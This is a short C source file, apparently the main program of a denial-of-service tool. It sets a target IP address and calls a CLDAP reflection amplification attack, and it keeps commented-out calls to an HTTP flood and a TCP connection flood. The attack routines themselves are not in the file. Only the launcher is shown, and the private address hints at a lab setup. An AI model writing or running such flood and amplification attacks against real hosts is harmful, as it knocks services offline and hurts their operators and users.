#include "main.h"

int main() {
    IPinfo ipinfo;
    int MAX_THREADS = 1;
    unsigned long attacked_addr = inet_addr("192.168.1.245");

    ipinfo.attacked_addr = attacked_addr;
    
    cldap_amplification(ipinfo, MAX_THREADS);
    // http_flood(ipinfo, MAX_THREADS);
    // tcp_conn_flood(ipinfo, MAX_THREADS);

    return 0;
}